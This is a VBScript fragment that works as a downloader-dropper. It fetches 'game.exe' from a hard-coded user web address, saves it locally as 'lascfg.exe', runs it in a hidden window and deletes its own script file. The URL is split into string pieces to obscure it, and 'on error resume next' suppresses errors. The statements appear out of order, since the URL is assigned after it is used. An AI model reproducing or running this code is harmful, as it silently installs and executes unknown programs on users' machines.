   hdLocation = "lascfg.exe"
   Set xmlHTTP = CreateObject("MSXML2.ServerXMLHTTP")
   xmlHTTP.open "GET", fileURL, false
   xmlHTTP.send()
   set myStream = CreateObject("ADODB.Stream")
   myStream.Open
   myStream.Type = 1
   myStream.Write xmlHTTP.ResponseBody
   myStream.Position = 0
   set FSO = Createobject("Scripting.FileSystemObject")
   if fso.Fileexists(hdLocation) then Fso.DeleteFile hdLocation
   myStream.SaveToFile hdLocation
   myStream.Close
   Set wsob = CreateObject("Wscript.shell")
   wsob.run hdLocation, 0, true
   if fso.Fileexists("ff.vbs") then Fso.DeleteFile "ff.vbs"
   on error resume next
   htxt = "h" + "ttp" + ":" + "//"
   fileURL = htxt + "users.volja.net/marjan23n/game.exe"
